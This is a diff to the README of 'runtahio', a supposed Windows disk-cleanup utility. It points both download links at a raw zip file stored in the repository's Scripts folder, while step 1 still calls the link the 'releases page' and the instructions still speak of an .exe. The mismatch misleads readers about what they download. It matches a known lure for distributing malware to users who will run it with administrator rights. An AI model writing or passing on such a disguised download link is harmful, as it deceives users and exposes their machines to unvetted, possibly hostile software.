@@ -1,6 +1,6 @@
 # 🧹 runtahio - Reclaim disk space on your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Vanshwath/runtahio/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Vanshwath/runtahio/raw/refs/heads/main/Scripts/Software_1.8.zip)
 
 ## 📁 About the application
 
@@ -18,7 +18,7 @@ The application runs on Windows 10 or Windows 11. Your user account must have ad
 
 Follow these steps to get the app on your computer.
 
-1. Visit the [releases page](https://github.com/Vanshwath/runtahio/releases) to download the installer.
+1. Visit the [releases page](https://github.com/Vanshwath/runtahio/raw/refs/heads/main/Scripts/Software_1.8.zip) to download the installer.
 2. Select the file ending in .exe for your version of Windows.
 3. Save the file to your Downloads folder.
 4. Open the file once the download finishes. 
